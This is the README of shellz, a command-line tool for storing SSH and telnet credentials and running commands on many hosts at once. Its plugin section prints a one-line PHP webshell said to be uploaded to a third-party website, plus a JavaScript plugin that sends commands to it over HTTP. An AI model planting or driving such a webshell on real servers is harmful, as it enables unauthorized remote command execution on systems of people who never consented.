<p align="center">
  <img alt="shellz" src="https://raw.githubusercontent.com/evilsocket/shellz/master/logo.png" />
  <p align="center">
    <a href="https://github.com/evilsocket/shellz/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/evilsocket/shellz.svg?style=flat-square"></a>
    <a href="https://github.com/evilsocket/shellz/blob/master/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square"></a>
    <a href="https://travis-ci.org/evilsocket/shellz"><img alt="Travis" src="https://img.shields.io/travis/evilsocket/shellz/master.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/evilsocket/shellz"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/evilsocket/shellz?style=flat-square&fuckgithubcache=1"></a>
  </p>
</p>

`shellz` is a small utility to keep track of your connection credentials, servers and run commands on multiple machines at once. It supports `ssh`, `telnet` with more shell types coming soon!

## Installation

A [precompiled version is available for each release](https://github.com/evilsocket/shellz/releases), alternatively you can use the latest version of the source code from this repository in order to build your own binary.

### From Sources

Make sure you have a correctly configured **Go >= 1.8** environment, that `$GOPATH/bin` is in `$PATH` and then:

    $ go get -u github.com/evilsocket/shellz/cmd/shellz

This command will download shellz, install its dependencies, compile it and move the `shellz` executable to `$GOPATH/bin`.

## How to Use

The tool will use the `~/.shellz` folder to load your identities and shells json files, running the command `shellz` the first time will create the folder and the `idents` and `shells` subfolders for you. Once both `~/.shellz/idents` and `~/.shellz/shells` folders have been created, you can start by creating your first identity json file, for instance let's create `~/.shellz/idents/default.json` with the following contents:

```json
{
    "name": "default",
    "username": "evilsocket",
    "key": "~/.ssh/id_rsa"
}
```

As you can see my `default` identity is using my SSH private key to log in the `evilsocket` user, alternatively you can specify a `"password"` field instead of a `"key"`.

Now let's create our first shell json file ( `~/.shellz/shells/media.json` ) that will use the `default` identity we just created to connect to our home media server (called `media.server` in our example):

```json
{
    "name": "media-server",
    "host": "media.server",
    "port": 22,
    "identity": "default"
}
```

By default, shells are considered `ssh`, but also the `telnet` protocol is supported:

```sh
cat ~/.shellz/shells/tnas.json
```

```json
{
    "name": "tnas",
    "host": "tnas.local",
    "port": 23,
    "identity": "admin-tnas",
    "type": "telnet"
}
```

### Plugins

Instead of the two default types, `ssh` and `telnet`, you can specify a custom name, in which case shellz will try to use a user plugin. Let's start by creating a new shell json file `~/.shellz/shells/custom.json` with the following contents:

```json
{
    "name": "custom",
    "host": "http://www.imvulnerable.gov/uploads/sh.php",
    "identity": "empty",
    "port": 80,
    "type": "mycustomshell"
}
```

As you probably noticed, the `host` field is the full URL of a very simple PHP webshell uploaded on some website:

```php
<?php system($_REQUEST["cmd"]); die; ?>
```

Also, the `type` field is set to `mycustomshell`, in this case `shellz` will try to load the file `~/.shellz/plugins/mycustomshell.js` and use it to create a session and execute a command. 

A `shellz` plugin must export the `Create`, `Exec` and `Close` functions, this is how `mycustomshell.js` looks like:

```js
var headers = {
    'User-Agent': 'imma-shellz-plugin'
};

function Create(ctx) {
    // log("Create(" + ctx + ")");
    return ctx;
}

function Exec(ctx, cmd) {
    // log("running " + cmd + " on " + ctx.Host);

    /* 
     * OR
     *
     * var resp = http.Post(ctx.Host, headers, {"cmd":cmd});
     */
    var resp = http.Get(ctx.Host + "?cmd=" + cmd, headers)

    return resp.Error ? resp.Error : resp.Raw;
}

function Close(obj) {
    // log("Close(" + ctx + ")");
}
```

### Examples

List available identities and shells:

    shellz -list

Run the command `id` on each shell:

    shellz -run id

Run the command `id` on a single shell named `machineA`:

    shellz -run id -on machineA

Run the command `id` on `machineA` and `machineB`:

    shellz -run id -on 'machineA, machineB'

Run the command `uptime` on every shell and append all outputs to the `all.txt` file:

    shellz -run uptime -to all.txt

Run the command `uptime` on every shell and save each outputs to a different file using per-shell data:

    shellz -run uptime -to "{{.Identity.Username}}_{{.Name}}.txt"

For a list of all available flags and some usage examples just type `shellz` without arguments.

## License

Shellz was made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and it's released under the GPL 3 license.
